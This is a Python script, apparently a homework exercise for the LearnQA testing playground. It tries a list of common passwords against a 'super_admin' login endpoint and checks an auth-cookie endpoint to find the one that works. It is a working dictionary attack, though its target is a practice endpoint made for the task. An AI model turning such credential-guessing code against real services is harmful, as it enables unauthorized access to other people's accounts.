import requests

login = 'super_admin'

login_url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
check_url = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'

passwords = ['123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345', 'iloveyou', '111111',
             '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely',
             '77777770', 'welcome', '888888', 'princess', 'dragon', 'password1']


def log_in(password):
    response = requests.post(login_url, data={'login': login, 'password': password})
    return response.cookies


def check_auth(cookies):
    response = requests.post(check_url, cookies=cookies)
    return response.content.decode('utf-8')


for password in passwords:
    cook = log_in(password)
    auth = check_auth(cook)
    if auth != 'You are NOT authorized':
        print(password)
        print(auth)
